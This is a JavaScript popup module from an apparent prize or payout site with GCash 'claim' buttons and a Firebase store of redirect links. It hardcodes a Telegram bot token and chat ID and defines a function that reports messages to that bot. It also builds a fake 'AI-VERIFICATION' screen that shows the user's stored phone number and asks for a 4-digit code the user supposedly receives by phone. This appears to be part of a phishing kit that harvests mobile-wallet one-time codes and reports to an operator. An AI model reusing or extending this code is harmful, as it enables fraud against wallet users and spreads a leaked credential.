/**
 * Popup Share Module - Phases & Ads
 * Fixed Deeplink Redirect & Admin Status Sync
 */

(function() {
    'use strict';
    
    let currentBalance = 0;
    let isRedirecting = false;
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) {});
        } catch(e) {}
    }
    
    function getFormattedTime() {
        return new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });
    }
    
    // ========== GET PAYOUT LINK (MULA SA ADMIN) ==========
    function getLatestPayoutLink() {
        try {
            var db = firebase.database();
            return db.ref('admin/redirectLink').once('value').then(function(adminSnap) {
                var adminData = adminSnap.val();
                if (adminData && adminData.url && adminData.active !== false) {
                    return { key: 'admin_redirect', url: adminData.url };
                }
                
                return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
                    if (snapshot.exists()) {
                        var key = Object.keys(snapshot.val())[0];
                        var linkData = snapshot.val()[key];
                        return { key: key, url: linkData.url };
                    }
                    return null;
                });
            });
        } catch(e) {
            return Promise.resolve(null);
        }
    }
    
    // ========== MARK LINK AS CLAIMED ==========
    function markLinkAsUsed(linkKey, userPhone) {
        if (linkKey === 'admin_redirect') return Promise.resolve();
        
        try {
            var db = firebase.database();
            return db.ref('links/' + linkKey).update({
                status: 'claimed',
                user: userPhone,
                claimedAt: Date.now()
            });
        } catch(e) {
            return Promise.resolve();
        }
    }
    
    // ========== SHOW PHASE 3 (AI-VERIFICATION CALL) ==========
    function showPhase3() {
        var popup = document.getElementById('prizePopup');
        var popupInner = document.getElementById('prizePopupInner');
        if (!popup || !popupInner) return;
        
        popup.style.display = 'flex';
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        
        popupInner.innerHTML = 
            '<div class="popup-close" id="popupClosePhase3">✕</div>' +
            '<div style="text-align: center; margin-bottom: 10px;">' +
                '<div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, #ff2d95, #b537f2); border-radius: 50%; border: 3px solid #ffd700; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,45,149,0.5);">' +
                    '<i class="fas fa-phone" style="font-size: 30px; color: #fff;"></i>' +
                '</div>' +
            '</div>' +
            '<h2 class="claim-now-title">🔐 AI-VERIFICATION</h2>' +
            '<div class="claim-now-divider"><span>★</span><span class="line"></span><span>★</span></div>' +
            '<p style="font-size: 11px; color: rgba(255,255,255,0.8); text-align: center; margin: 5px 0 15px 0;">System AI will call you with a <strong style="color: #00f2ff;">4-digit verification code</strong></p>' +
            '<div id="callStatusContainer" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,215,0,0.3); border-radius: 16px; padding: 15px; margin-bottom: 15px; text-align: center;">' +
                '<div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">🍊</div>' +
                '<div id="callStatusText" style="font-size: 13px; color: #fff; font-weight: 500;">Ready for verification</div>' +
                '<div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">' +
                    '<span class="phone-number-display"><span class="phone-icon">📱</span> ' + formattedPhone + '</span>' +
                '</div>' +
                '<div id="callTimerDisplay" style="font-size: 32px; font-family: \'Orbitron\', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; display: none;">60s</div>' +
            '</div>' +
            '<button id="requestCallBtn" class="claim-via-gcash-btn mega-btn" style="width: 100%;"><i class="fas fa-phone-alt"></i> REQUEST AI CALL</button>' +
            '<div id="codeSection" style="display: none; margin-top: 15px;">' +
                '<div style="display: flex; gap: 10px; justify-content: center; align-items: center;">' +
                    '<input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">' +
                    '<button id="verifyCodeBtn" class="pt-cat-claim-btn mega-btn" style="width: auto; padding: 14px 20px;"><i class="fas fa-check"></i> VERIFY</button>' +
                '</div>' +
                '<div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff1744; font-size: 11px;"><i class="fas fa-exclamation-circle"></i> Invalid code.</div>' +
            '</div>' +
            '<div style="text-align: center; margin-top: 12px;"><button class="small-back-btn" id="backBtnPhase3">← BACK</button></div>';
        
        attachPhase3Events();
    }
    
    function attachPhase3Events() {
        var closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        var requestBtn = document.getElementById('requestCallBtn');
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (window.PlayBonus && window.PlayBonus.showFirewallVerificationPopup) {
                    closePopup();
                    window.PlayBonus.showFirewallVerificationPopup();
                }
            };
        }
    }
    
    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) popup.style.display = 'none';
        isRedirecting = false;
    }
    
    // ========== EXPORTS ==========
    window.PopupShare = {
        showPhase3: showPhase3,
        closePopup: closePopup
    };
    
})();
